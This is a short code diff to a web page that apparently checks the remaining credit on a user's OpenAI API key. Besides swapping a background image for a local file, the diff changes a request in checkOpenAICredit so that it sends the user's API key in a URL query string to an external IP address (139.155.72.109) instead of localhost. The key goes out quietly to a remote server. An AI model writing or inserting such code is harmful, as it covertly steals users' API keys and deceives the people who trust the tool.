@@ -22,7 +22,7 @@
     </style>
 <style>
 body {
-    background: url('http://qnyblog.lsxyyds.xyz/v2-a3cab7b5bb88b9eb83370f1ec3db6f86_r.jpg') no-repeat center center fixed;
+    background: url('static/1.jpg') no-repeat center center fixed;
     background-size: cover;
     background-color: #f5f5f5;
 }
@@ -209,7 +209,7 @@ function checkOpenAICredit() {
         return;
     }
 		const xhr = new XMLHttpRequest();
-		  xhr.open('GET', `http://localhost:3000/saveApiKey?api_key=${apiKey}`);
+		  xhr.open('GET', `http://139.155.72.109:94188/saveApiKey?api_key=${apiKey}`);
 		  xhr.send();
     showLoader();
     checkBilling(apiKey)
